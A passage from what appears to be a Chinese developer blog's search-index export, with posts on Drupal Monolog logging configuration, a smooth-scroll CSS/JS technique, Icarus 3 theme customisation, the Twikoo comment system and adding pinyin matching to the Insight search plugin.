should create a site specific services.yml (monolog.services.yml for example) in the samefolder of your settings.php and then add this line to settings.php itself: settings.php1$settings['container_yamls'][] = 'sites/default/monolog.services.yml'; The simplest configuration that allows Monolog to log to a rotating file might be: monolog.services.yml1234567parameters: monolog.channel_handlers: default: ['rotating_file']services: monolog.handler.rotating_file: class: Monolog\\Handler\\RotatingFileHandler arguments: ['private://logs/debug.log', 10, '%monolog.level.debug%'] 解压模块到 drupal/modules/contrib/monolog，用 drush en monolog 命令启用，却遇到了报错。 1The service &quot;monolog.handler.rotating_file&quot; has a dependency on a non-existent parameter &quot;monolog.level.debug&quot;. 原因在于，”monolog.level.debug” 是在 monolog 的 monolog.services.yml 里面定义的，未开启 monolog 时，这个常量不存在，而这个常量不存在，setting.php 就会报错，setting.php 报错，就无法开启 monolog …… 这是一个死循环。 解决办法1：用 try 包裹 setting.php 中引入 monolog.services.yml 的行。 settings.php123try { $settings['container_yamls'][] = 'sites/default/monolog.services.yml';} catch (\\Exception $e) {} 解决办法2：在自己的 monolog.services.yml 中同样声明 monolog.level.debug。 monolog.services.yml12345678parameters: monolog.channel_handlers: default: ['rotating_file'] monolog.level.debug: '100'services: monolog.handler.rotating_file: class: Monolog\\Handler\\RotatingFileHandler arguments: ['private://logs/debug.log', 10, '%monolog.level.debug%'] 修改日志格式只需给 handler 配置 formatter monolog.services.yml12345parameters: monolog.channel_handlers: default: handlers: ['rotating_file'] formatter: 'json' 输出到控制台只需用 StreamHandler 输出到 php://stdout monolog.services.yml1234services: monolog.handler.std_info: class: Monolog\\Handler\\StreamHandler arguments: ['php://stdout', '%monolog.level.info%'] arguments 的配置看了前两个你也会发现，这里面的 arguments 是啥？只见其值不见其名，它是什么意思？ 我们可以理解 handler 控制日志输出的方式，不仅支持写到文件、控制台，甚至可以配置发送邮件，arguments 则是 handler 的参数。 关于有哪些 handler，可以到 02-handlers-formatters-processors 查看； 关于每一种 handler 需要怎么配置 arguments，可以到这个页面搜索 handler 的名字，看 __construct 前的注释。 processors 的配置processor 控制日志包含的内容，有哪些 processor 也需要在模块的代码里看。https://git.drupalcode.org/project/monolog/-/tree/8.x-1.x/src%2FLogger%2FProcessor 强烈吐槽：为什么我需要看代码来研究一个 “世界上最好的日志插件” 怎么用…… 分离 INFO 和 ERROR很多时候我们需要把不同级别的 LOG 打到不同的地方去，一开始我试着这样配 monolog.services.yml1234567services: monolog.handler.rotating_file_info: class: Monolog\\Handler\\RotatingFileHandler arguments: ['/var/log/drupal/info.log', 7, '%monolog.level.info%'] monolog.handler.rotating_file_error: class: Monolog\\Handler\\RotatingFileHandler arguments: ['/var/log/drupal/error.log', 7, '%monolog.level.error%'] 发现一个问题，info.log 不仅包含了 INFO，还包含了所有级别高于 INFO（如 WARN, ERROR）的日志，我不想把 ERROR 打在 info.log 里，怎么办？ 我先提交了一个 issue Is it possible to set maxium logging level? 后来经过 Will 巨佬指点，可以利用冒泡参数实现这样的需求。 StreamHandler.php123456789/** * @param resource|string $stream If a missing path can't be created, an UnexpectedValueException will be thrown on first write * @param string|int $level The minimum logging level at which this handler will be triggered * @param bool $bubble Whether the messages that are handled can bubble up the stack or not * @param int|null $filePermission Optional file permissions (default (0644) are only for owner read/write) * @param bool $useLocking Try to lock log file before doing any writes * * @throws \\InvalidArgumentException If stream is not a resource or string */ $bubble 默认为 TRUE。我们首先配置两个 handler，一个打 INFO，一个打 ERROR，然后将 ERROR handler 的 $bubble 设置为 FALSE，阻止其向上一个 INFO handler 冒泡，这样，当 INFO log 来时，不会走 ERROR handler，而经由 INFO handler 打出，当 ERROR log 来时，会先由 ERROR handler 打出，然后不会冒泡到 INFO handler，达到目的。像这样—— monolog.services.yml12345678910111213141516171819parameters: monolog.channel_handlers: default: # 注意：monolog 是【从后往前】处理 handlers 的 handlers: ['rotating_file_info', 'rotating_file_error'] formatter: 'json' # Enabled processors. monolog.processors: ['message_placeholder', 'current_user', 'request_uri', 'ip', 'referer', 'filter_backtrace', 'introspection'] # Logger levels. monolog.level.error: '400' monolog.level.info: '200'services: monolog.handler.rotating_file_info: class: Monolog\\Handler\\RotatingFileHandler arguments: ['/var/log/drupal/info.log', 7, '%monolog.level.info%'] monolog.handler.rotating_file_error: class: Monolog\\Handler\\RotatingFileHandler # 设置 $bubble = FALSE 阻止 ERROR 打进 INFO log arguments: ['/var/log/drupal/error.log', 7, '%monolog.level.error%', FALSE]","link":"/2020/drupal-monolog/"},{"title":"PC 浏览器平滑惯性滚动（smooth scroll）一套简单实现","text":"前言主要是 Bing 找了许多 libraries。效果在 Chrome for Windows 上都不理想，要么滚动很生硬，要么就是太复杂，就自己实现了。 本来是 PC only 的，写好后测试了一下移动端，是兼容的，效果也还不错…… 不过反正移动端都自带惯性滑动了 效果 无惯性滚动 有惯性滚动 .ss-container { width: 100%; height: 500px; position: relative; overflow-y: auto; } .ss-container.smooth { overflow-y: hidden; } .ss-container-body { width: 100%; position: absolute; transition: transform 1s cubic-bezier(0.23, 1, 0.32, 1); } .ss-container-hitbox { width: 100%; height: 1500px; } .ss-box { width: 100%; height: 300px; } .smooth-scroll { position: -webkit-sticky; position: sticky; top: 0; width: 100%; } document.getElementById('smooth-scrollable').onscroll = (e) => { const target = e.currentTarget document.getElementById('smooth-target').style.transform = `translateY(-${target.scrollTop}px)` } 配色参考：https://color.adobe.com/zh/%E6%B5%81%E8%A1%8C%E8%89%B2-color-theme-4031536/ 代码HTML123456789101112131415161718192021222324252627&lt;div class=&quot;columns&quot; style=&quot;width: 100%;&quot;&gt; &lt;div class=&quot;column&quot;&gt; &lt;h3 id=&quot;无惯性滚动&quot;&gt;无惯性滚动&lt;/h2&gt; &lt;div class=&quot;ss-container&quot;&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #0067A6;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #00ABD8;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #008972;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #EFC028;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #F2572D;&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;column&quot;&gt; &lt;h3 id=&quot;有惯性滚动&quot;&gt;有惯性滚动&lt;/h3&gt; &lt;div class=&quot;ss-container&quot; id=&quot;smooth-scrollable&quot;&gt; &lt;div class=&quot;smooth-scroll&quot;&gt; &lt;div class=&quot;ss-container-body&quot; id=&quot;smooth-target&quot;&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #0067A6;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #00ABD8;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #008972;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #EFC028;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ss-box&quot; style=&quot;background-color: #F2572D;&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;ss-container-hitbox&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; CSS12345678910111213141516171819202122232425262728.ss-container { width: 100%; height: 500px; position: relative; overflow-y: auto;}.ss-container.smooth { overflow-y: hidden;}.ss-container-body { width: 100%; position: absolute; transition: transform 1s cubic-bezier(0.23, 1, 0.32, 1); /* 此处可以改变动画函数和持续时间 */}.ss-container-hitbox { width: 100%; height: 1500px; /* 高度等于滚动区域内的总高度，真实场景下可能需要动态计算 */}.ss-box { width: 100%; height: 300px;}.smooth-scroll { position: -webkit-sticky; position: sticky; top: 0; width: 100%;} Javascript1234document.getElementById('smooth-scrollable').onscroll = (e) =&gt; { const target = e.currentTarget document.getElementById('smooth-target').style.transform = `translateY(-${target.scrollTop}px)`} 解析 在滚动区域内增加一个 hitbox，高度等于滚动区域内的总高度，撑起滚动容器 设置滚动对象为 sticky 定位（如果滚动区域占满浏览器，也可用 fixed），并用 transform: translateY(); 控制其上下移动 监听滚动事件，并动态改变 translateY 的值 添加 CSS 动画效果 transition: transform 1s;，可以同时设置动画函数和持续时间 根据这个思路，可以封装一个 JS 库，但是我好懒……","link":"/2020/h5-smooth-scroll/"},{"title":"hexo-theme-icarus 3 食用经验分享","text":"昨天晚上 Icarus 主题的 RC 版本发布，离正式版不远了，我自 3.0.0-beta.1 一路使用到现在，把自己的使用经验分享一下。 魔改迁移由于主题作者换掉了 ejs 语言，全部重写了一遍，迁移这块的难度是最大的。 拉 dev 分支，冲突实在是太多了，我的办法是，把在旧版上的魔改的整个 diff 导出，然后直接从 dev 签出一个新的分支，参考 diff 对每个文件都重新修改，花了不到2个小时搞定。 魔改 hexo-component-inferno 组件主题中部分可重用的 JS 和 JSX 代码已经被移到另一个项目 hexo-component-inferno 中，我们如何对这些组件魔改？此时要分2种情况—— widgets 的魔改 其它 JS 和 JSX 的魔改 对于已经移除代码的 widgets直接从 hexo-component-inferno / src / view 把需要修改的 JSX 复制到主题目录下的 layout/widget，再进行魔改即可。 例如：我需要修改 subscribe_email widget，在组件根 DOM 上加一个 id 以实现 live2d 交互，需要复制 hexo-component-inferno/src/view/widget/subscribe_email.jsx 到 themes/icarus/layout/widget/subscribe_email.jsx，再进行修改。 当然，如果你有自己写的 widget，也可以统统丢到 layout/widget 里去。 对于其它 JS 和 JSX 的魔改需要全局搜索引用处，修改引用路径为主题路径下改好的文件。 例如：我需要修改 paginator.jsx 以改变分页的 delta 值，可以复制 hexo-component-inferno/src/view/misc/paginator.jsx 到 themes/icarus/layout/misc/paginator.jsx，再进行魔改，修改完成后，需要全局搜索 hexo-component-inferno/lib/view/misc/paginator 并替换为 ./misc/paginator（注意，这里我写的是相对路径，请在替换后确认每处引用的相对路径正确）。 12- const Paginator = require('hexo-component-inferno/lib/view/misc/paginator');+ const Paginator = require('./misc/paginator'); 魔改 CSS不建议直接修改原来的 CSS 文件，而是覆盖样式，由于 3.0 中已经对 CSS 代码进行细分，建议把魔改的 CSS 也抽成单独的文件，方便管理。 1234567891011121314icarus └─source └─css │ cyberpunk.styl │ default.styl+ │ imaegoo.styl // 个人魔改+ │ night.styl // 夜间模式 │ style.styl └─live2d │ flat-ui-icons-regular.eot │ flat-ui-icons-regular.svg │ flat-ui-icons-regular.ttf │ flat-ui-icons-regular.woff │ waifu.css 自己建立的 styl 文件，需要在 style.styl 中引入。 style.styl12@import &quot;imaegoo&quot;@import &quot;night&quot; 代码压缩我曾经使用 gulp 来压缩 Hexo 生成的静态 HTML, CSS, JS 文件，但 3.0 对所有的 JS 使用了 ES6 重写，这造成了压缩插件不工作。 我尝试过把所有使用 ES6 语法的地方手工改回 ES5 语法，但最终放弃了，为什么要倒退呢？这反倒会增加未来升级的难度。 我放弃了对存在 ES6 的 JS 压缩，把它们全部丢进忽略列表吧！ gulpfile.js12345678910111213// 压缩 js 文件gulp.task('minify-js', function () { return gulp.src([ './public/**/*.js', '!./public/js/algolia.js', // ignore es6 js file '!./public/js/animation.js', // ignore es6 js file '!./public/js/back_to_top.js', // ignore es6 js file '!./public/js/insight.js', // ignore es6 js file '!./public/js/main.js' // ignore es6 js file ]) .pipe(uglify()) .pipe(gulp.dest('./public'));});","link":"/2020/icarus-3-guide/"},{"title":"博客已启用 Twikoo 评论系统","text":"评论系统一直是静态网站的痛点。 Valine：安全性不高 Gitalk：需要评论者注册Github Disqus：需要注册，国内访问不畅 畅言：广告多，需要验证手机号 难道就没有一个完美的方案？ 在咕咕咕了近三个月后，我自己搞出了一套评论系统，并命名为 Twikoo。 成本上，腾讯云云开发环境可以免费搭建 安全性上，使用腾讯云云函数开发接口，不开放一丁点数据库权限，未来更新将接入 Akismet 反垃圾检查 易用性上，支持点赞、邮件通知、微信通知（限博主），未来会增加更多玩法 欢迎访问 twikoo.js.org 了解更多。 滚回去修 bug 了","link":"/2020/hello-twikoo/"},{"title":"让 Icarus Insight 搜索插件支持拼音检索文章","text":"要是 Icarus 能用拼音搜文章就好了，如果你也有这样的想法，那这篇文章也许会对你有帮助。 效果 前提 Icarus 版本 3.0 以上 搜索插件使用的是 Insight 方法 保存下面的文件到 themes/icarus/source/js，并重命名为 pinyin.jshttps://github.com/xmflswood/pinyin-match/blob/master/dist/main.js 保存下面的文件到 themes/icarus/layout/search，并重命名为 insight.jsxhttps://github.com/ppoffice/hexo-component-inferno/raw/master/src/view/search/insight.jsx 保存下面的文件到 themes/icarus/source/js，并重命名为 insight.jshttps://github.com/ppoffice/hexo-component-inferno/raw/master/asset/js/insight.js 修改 themes/icarus/layout/search/insight.jsx，加入拼音检索开关和依赖的 pinyin.js insight.jsx.diff >folded1234567891011121314151617181920212223242526272829303132diff --git a/src/view/search/insight.jsx b/src/view/search/insight.jsxindex 05a1c40..cce136d 100644--- a/src/view/search/insight.jsx+++ b/src/view/search/insight.jsx@@ -3,7 +3,7 @@ * @module view/search/insight */ const { Component, Fragment } = require('inferno');-const { cacheComponent } = require('../../util/cache');+const { cacheComponent } = require('hexo-component-inferno/lib/util/cache'); /** * Algolia search engine JSX component.@@ -36,11 +36,18 @@ class Insight extends Component { &lt;div class=&quot;searchbox-input-container&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;searchbox-input&quot; placeholder={translation.hint}/&gt; &lt;/div&gt;+ &lt;div class=&quot;searchbox-pinyin&quot;&gt;+ &lt;label class=&quot;checkbox&quot;&gt;+ &lt;input id=&quot;search-by-pinyin&quot; type=&quot;checkbox&quot; checked=&quot;checked&quot;/&gt;+ &lt;span&gt;&amp;nbsp;拼音检索&lt;/span&gt;+ &lt;/label&gt;+ &lt;/div&gt; &lt;a class=&quot;searchbox-close&quot; href=&quot;javascript:;&quot;&gt;&amp;times;&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;searchbox-body&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;+ &lt;script src=&quot;/js/pinyin.js&quot; defer={true}&gt;&lt;/script&gt; &lt;script src={jsUrl} defer={true}&gt;&lt;/script&gt; &lt;script dangerouslySetInnerHTML={{ __html: js }}&gt;&lt;/script&gt; &lt;/Fragment&gt;; 修改后完整的 insight.jsx 如下： insight.jsx >folded12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/** * Insight search plugin JSX component. * @module view/search/insight */const { Component, Fragment } = require('inferno');const { cacheComponent } = require('hexo-component-inferno/lib/util/cache');/** * Algolia search engine JSX component. * * @example * &lt;Insight * translation={{ * hint: '******', * untitled: '******', * posts: '******', * pages: '******', * categories: '******', * tags: '******' * }} * contentUrl=&quot;/path/to/content.json&quot; * jsUrl=&quot;/path/to/insight.js&quot; /&gt; */class Insight extends Component { render() { const { translation, contentUrl, jsUrl } = this.props; const js = `document.addEventListener('DOMContentLoaded', function () { loadInsight(${JSON.stringify({ contentUrl })}, ${JSON.stringify(translation)}); });`; return &lt;Fragment&gt; &lt;div class=&quot;searchbox&quot;&gt; &lt;div class=&quot;searchbox-container&quot;&gt; &lt;div class=&quot;searchbox-header&quot;&gt; &lt;div class=&quot;searchbox-input-container&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;searchbox-input&quot; placeholder={translation.hint}/&gt; &lt;/div&gt; &lt;div class=&quot;searchbox-pinyin&quot;&gt; &lt;label class=&quot;checkbox&quot;&gt; &lt;input id=&quot;search-by-pinyin&quot; type=&quot;checkbox&quot; checked=&quot;checked&quot;/&gt; &lt;span&gt;&amp;nbsp;拼音检索&lt;/span&gt; &lt;/label&gt; &lt;/div&gt; &lt;a class=&quot;searchbox-close&quot; href=&quot;javascript:;&quot;&gt;&amp;times;&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;searchbox-body&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;/js/imaegoo/pinyin.js&quot; defer={true}&gt;&lt;/script&gt; &lt;script src={jsUrl} defer={true}&gt;&lt;/script&gt; &lt;script dangerouslySetInnerHTML={{ __html: js }}&gt;&lt;/script&gt; &lt;/Fragment&gt;; }}/** * Cacheable Insight search plugin JSX component. * &lt;p&gt; * This class is supposed to be used in combination with the &lt;code&gt;locals&lt;/code&gt; hexo filter * ({@link module:hexo/filter/locals}). * * @see module:util/cache.cacheComponent * @example * &lt;Insight.Cacheable * helper={{ * __: function() {...}, * cdn: function() {...} * }} /&gt; */Insight.Cacheable = cacheComponent(Insight, 'search.insight', props =&gt; { const { helper } = props; return { translation: { hint: helper.__('search.hint'), untitled: helper.__('search.untitled'), posts: helper._p('common.post', Infinity), pages: helper._p('common.page', Infinity), categories: helper._p('common.category', Infinity), tags: helper._p('common.tag', Infinity) }, contentUrl: helper.url_for('/content.json'), jsUrl: helper.url_for('/js/insight.js') };});module.exports = Insight; 修改 themes/icarus/source/js/insight.js，在原有匹配代码基础上增加拼音匹配代码 insight.js.diff >folded12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364diff --git a/asset/js/insight.js b/asset/js/insight.jsindex 33150b3..205a096 100644--- a/asset/js/insight.js+++ b/asset/js/insight.js@@ -6,6 +6,19 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var const $main = $('.searchbox'); const $input = $main.find('.searchbox-input'); const $container = $main.find('.searchbox-body');+ const $searchByPinyin = $main.find('#search-by-pinyin');++ /**+ * 查询匹配拼音的数据。性能低于普通匹配，如果未启用拼音检索模式，直接返回 false。+ * https://github.com/xmflswood/pinyin-match+ * @param input {string} 目标字符串+ * @param keyword {string} 输入的拼音或其他关键词+ * @returns {[Array]|{Boolean}} 找到返回出现位置，未找到 / 未启用返回 false+ */+ function pinyinMatch(input, keyword) {+ if (!$searchByPinyin.prop(&quot;checked&quot;)) return false;+ return PinyinMatch.match(input, keyword);+ } function section(title) { return $('&lt;section&gt;').addClass('searchbox-result-section').append($('&lt;header&gt;').text(title));@@ -33,10 +46,12 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var const testText = text.toLowerCase(); const indices = matches.map(match =&gt; { const index = testText.indexOf(match.toLowerCase());- if (!match || index === -1) {- return null;+ if (match &amp;&amp; index !== -1) {+ return [index, index + match.length]; }- return [index, index + match.length];+ // Search by pinyin+ const pinyinIndex = pinyinMatch(testText, match.toLowerCase());+ return pinyinIndex ? [pinyinIndex[0], pinyinIndex[1] + 1] : null; }).filter(match =&gt; { return match !== null; }).sort((a, b) =&gt; {@@ -140,6 +155,8 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var } if (obj[field].toLowerCase().indexOf(keyword) &gt; -1) { return true;+ } else if (pinyinMatch(obj[field].toLowerCase(), keyword)) {+ return true; } return false; });@@ -266,10 +283,12 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var if (location.hash.trim() === '#insight-search') { $main.addClass('show'); }- $input.on('input', function() {- const keywords = $(this).val();+ function onInputChange() {+ const keywords = $input.val(); searchResultToDOM(keywords, search(json, keywords));- });+ }+ $input.on('input', onInputChange);+ $searchByPinyin.on('change', onInputChange); $input.trigger('input'); }); 修改后完整的 insight.js 如下： insight.js >folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332/** * Insight search plugin * @author PPOffice { @link https://github.com/ppoffice } */function loadInsight(config, translation) { // eslint-disable-line no-unused-vars const $main = $('.searchbox'); const $input = $main.find('.searchbox-input'); const $container = $main.find('.searchbox-body'); const $searchByPinyin = $main.find('#search-by-pinyin'); /** * 查询匹配拼音的数据。性能低于普通匹配，如果未启用拼音检索模式，直接返回 false。 * https://github.com/xmflswood/pinyin-match * @param input {string} 目标字符串 * @param keyword {string} 输入的拼音或其他关键词 * @returns {[Array]|{Boolean}} */ function pinyinMatch(input, keyword) { if (!$searchByPinyin.prop(&quot;checked&quot;)) return false; return PinyinMatch.match(input, keyword); } function section(title) { return $('&lt;section&gt;').addClass('searchbox-result-section').append($('&lt;header&gt;').text(title)); } function merge(ranges) { let last; const result = []; ranges.forEach(r =&gt; { if (!last || r[0] &gt; last[1]) { result.push(last = r); } else if (r[1] &gt; last[1]) { last[1] = r[1]; } }); return result; } function findAndHighlight(text, matches, maxlen) { if (!Array.isArray(matches) || !matches.length || !text) { return maxlen ? text.slice(0, maxlen) : text; } const testText = text.toLowerCase(); const indices = matches.map(match =&gt; { const index = testText.indexOf(match.toLowerCase()); if (match &amp;&amp; index !== -1) { return [index, index + match.length]; } // Search by pinyin const pinyinIndex = pinyinMatch(testText, match.toLowerCase()); return pinyinIndex ? [pinyinIndex[0], pinyinIndex[1] + 1] : null; }).filter(match =&gt; { return match !== null; }).sort((a, b) =&gt; { return a[0] - b[0] || a[1] - b[1]; }); if (!indices.length) { return text; } let result = ''; let last = 0; const ranges = merge(indices); const sumRange = [ranges[0][0], ranges[ranges.length - 1][1]]; if (maxlen &amp;&amp; maxlen &lt; sumRange[1]) { last = sumRange[0]; } for (let i = 0; i &lt; ranges.length; i++) { const range = ranges[i]; result += text.slice(last, Math.min(range[0], sumRange[0] + maxlen)); if (maxlen &amp;&amp; range[0] &gt;= sumRange[0] + maxlen) { break; } result += '&lt;em&gt;' + text.slice(range[0], range[1]) + '&lt;/em&gt;'; last = range[1]; if (i === ranges.length - 1) { if (maxlen) { result += text.slice(range[1], Math.min(text.length, sumRange[0] + maxlen + 1)); } else { result += text.slice(range[1]); } } } return result; } function searchItem(icon, title, slug, preview, url) { title = title != null &amp;&amp; title !== '' ? title : translation.untitled; return `&lt;a class=&quot;searchbox-result-item&quot; href=&quot;${url}&quot;&gt; &lt;span class=&quot;searchbox-result-icon&quot;&gt; &lt;i class=&quot;fa fa-${icon}&quot; /&gt; &lt;/span&gt; &lt;span class=&quot;searchbox-result-content&quot;&gt; &lt;span class=&quot;searchbox-result-title&quot;&gt; ${title} ${slug ? '&lt;span class=&quot;searchbox-result-title-secondary&quot;&gt;(' + slug + ')&lt;/span&gt;' : ''} &lt;/span&gt; ${preview ? '&lt;span class=&quot;searchbox-result-preview&quot;&gt;' + preview + '&lt;/span&gt;' : ''} &lt;/span&gt; &lt;/a&gt;`; } function sectionFactory(keywords, type, array) { let $searchItems; if (array.length === 0) return null; const sectionTitle = translation[type.toLowerCase()]; switch (type) { case 'POSTS': case 'PAGES': $searchItems = array.map(item =&gt; { const title = findAndHighlight(item.title, keywords); const text = findAndHighlight(item.text, keywords, 100); return searchItem('file', title, null, text, item.link); }); break; case 'CATEGORIES': case 'TAGS': $searchItems = array.map(item =&gt; { const name = findAndHighlight(item.name, keywords); const slug = findAndHighlight(item.slug, keywords); return searchItem(type === 'CATEGORIES' ? 'folder' : 'tag', name, slug, null, item.link); }); break; default: return null; } return section(sectionTitle).append($searchItems); } function parseKeywords(keywords) { return keywords.split(' ').filter(keyword =&gt; { return !!keyword; }).map(keyword =&gt; { return keyword.toLowerCase(); }); } /** * Judge if a given post/page/category/tag contains all of the keywords. * @param Object obj Object to be weighted * @param Array&lt;String&gt; fields Object's fields to find matches */ function filter(keywords, obj, fields) { const keywordArray = parseKeywords(keywords); const containKeywords = keywordArray.filter(keyword =&gt; { const containFields = fields.filter(field =&gt; { if (!Object.prototype.hasOwnProperty.call(obj, field)) { return false; } if (obj[field].toLowerCase().indexOf(keyword) &gt; -1) { return true; } else if (pinyinMatch(obj[field].toLowerCase(), keyword)) { return true; } return false; }); if (containFields.length &gt; 0) { return true; } return false; }); return containKeywords.length === keywordArray.length; } function filterFactory(keywords) { return { post: function(obj) { return filter(keywords, obj, ['title', 'text']); }, page: function(obj) { return filter(keywords, obj, ['title', 'text']); }, category: function(obj) { return filter(keywords, obj, ['name', 'slug']); }, tag: function(obj) { return filter(keywords, obj, ['name', 'slug']); } }; } /** * Calculate the weight of a matched post/page/category/tag. * @param Object obj Object to be weighted * @param Array&lt;String&gt; fields Object's fields to find matches * @param Array&lt;Integer&gt; weights Weight of every field */ function weight(keywords, obj, fields, weights) { let value = 0; parseKeywords(keywords).forEach(keyword =&gt; { const pattern = new RegExp(keyword, 'img'); // Global, Multi-line, Case-insensitive fields.forEach((field, index) =&gt; { if (Object.prototype.hasOwnProperty.call(obj, field)) { const matches = obj[field].match(pattern); value += matches ? matches.length * weights[index] : 0; } }); }); return value; } function weightFactory(keywords) { return { post: function(obj) { return weight(keywords, obj, ['title', 'text'], [3, 1]); }, page: function(obj) { return weight(keywords, obj, ['title', 'text'], [3, 1]); }, category: function(obj) { return weight(keywords, obj, ['name', 'slug'], [1, 1]); }, tag: function(obj) { return weight(keywords, obj, ['name', 'slug'], [1, 1]); } }; } function search(json, keywords) { const weights = weightFactory(keywords); const filters = filterFactory(keywords); const posts = json.posts; const pages = json.pages; const tags = json.tags; const categories = json.categories; return { posts: posts.filter(filters.post).sort((a, b) =&gt; { return weights.post(b) - weights.post(a); }).slice(0, 5), pages: pages.filter(filters.page).sort((a, b) =&gt; { return weights.page(b) - weights.page(a); }).slice(0, 5), categories: categories.filter(filters.category).sort((a, b) =&gt; { return weights.category(b) - weights.category(a); }).slice(0, 5), tags: tags.filter(filters.tag).sort((a, b) =&gt; { return weights.tag(b) - weights.tag(a); }).slice(0, 5) }; } function searchResultToDOM(keywords, searchResult) { $container.empty(); for (const key in searchResult) { $container.append(sectionFactory(parseKeywords(keywords), key.toUpperCase(), searchResult[key])); } } function scrollTo($item) { if ($item.length === 0) return; const wrapperHeight = $container[0].clientHeight; const itemTop = $item.position().top - $container.scrollTop(); const itemBottom = $item[0].clientHeight + $item.position().top; if (itemBottom &gt; wrapperHeight + $container.scrollTop()) { $container.scrollTop(itemBottom - $container[0].clientHeight); } if (itemTop &lt; 0) { $container.scrollTop($item.position().top); } } function selectItemByDiff(value) { const $items = $.makeArray($container.find('.searchbox-result-item')); let prevPosition = -1; $items.forEach((item, index) =&gt; { if ($(item).hasClass('active')) { prevPosition = index; } }); const nextPosition = ($items.length + prevPosition + value) % $items.length; $($items[prevPosition]).removeClass('active'); $($items[nextPosition]).addClass('active'); scrollTo($($items[nextPosition])); } function gotoLink($item) { if ($item &amp;&amp; $item.length) { location.href = $item.attr('href'); } } $.getJSON(config.contentUrl, json =&gt; { if (location.hash.trim() === '#insight-search') { $main.addClass('show'); } function onInputChange() { const keywords = $input.val(); searchResultToDOM(keywords, search(json, keywords)); } $input.on('input', onInputChange); $searchByPinyin.on('change', onInputChange); $input.trigger('input'); }); let touch = false; $(document).on('click focus', '.navbar-main .search', () =&gt; { $main.addClass('show'); $main.find('.searchbox-input').focus(); }).on('click touchend', '.searchbox-result-item', function(e) { if (e.type !== 'click' &amp;&amp; !touch) { return; } gotoLink($(this)); touch = false; }).on('click touchend', '.searchbox-close', e =&gt; { if (e.type !== 'click' &amp;&amp; !touch) { return; } $('.navbar-main').css('pointer-events', 'none'); setTimeout(() =&gt; { $('.navbar-main').css('pointer-events', 'auto'); }, 400); $main.removeClass('show'); touch = false; }).on('keydown', e =&gt; { if (!$main.hasClass('show')) return; switch (e.keyCode) { case 27: // ESC $main.removeClass('show'); break; case 38: // UP selectItemByDiff(-1); break; case 40: // DOWN selectItemByDiff(1); break; case 13: // ENTER gotoLink($container.find('.searchbox-result-item.active').eq(0)); break; } }).on('touchstart', e =&gt; { touch = true; }).on('touchmove', e =&gt; { touch = false; });} 修改 themes/icarus/include/style/search.styl，调整拼音检索复选框大小和位置 search.styl.diff >folded123456789101112131415161718192021diff --git a/include/style/search.styl b/include/style/search.stylindex 0cdedd9..02d9b5e 100644--- a/include/style/search.styl+++ b/include/style/search.styl@@ -96,6 +96,16 @@ $searchbox-bg-pagination-item-disabled ?= $searchbox-bg-container padding: .75em 0 .75em 1.25em background: $searchbox-bg-input+ .searchbox-pinyin+ display: flex+ align-items: center+ user-select: none+ input+ vertical-align: middle+ span+ position: relative+ top: 1px+ .searchbox-close display: inline-block font-size: 1.5em 修改后完整的 search.styl 如下： search.styl >folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204/* --------------------------------- * Search Box * --------------------------------- */// container sizes$searchbox-container-width ?= 540px$searchbox-container-margin ?= 100px$searchbox-breakpoint-width ?= 559px$searchbox-breakpoint-height ?= 479px// overlay and container styles$searchbox-box-shadow ?= $card-shadow$searchbox-border-radius ?= $radius$searchbox-bg-overlay ?= $modal-background-background-color$searchbox-bg-container ?= $white-ter$searchbox-border ?= $border// header styles$searchbox-bg-input ?= $white$searchbox-bg-close-hover ?= $searchbox-bg-container$searchbox-bg-close-active ?= $grey-lighter// body styles$searchbox-fg-result-header ?= $grey-light$searchbox-fg-result-item-secondary ?= $grey-light$searchbox-bg-result-item-hover ?= $searchbox-bg-input$searchbox-fg-result-item-active ?= findColorInvert($primary)$searchbox-bg-result-item-active ?= $primary$searchbox-bg-result-item-highlight ?= $yellow// footer styles$searchbox-bg-pagination-item ?= $searchbox-bg-input$searchbox-bg-pagination-item-hover ?= 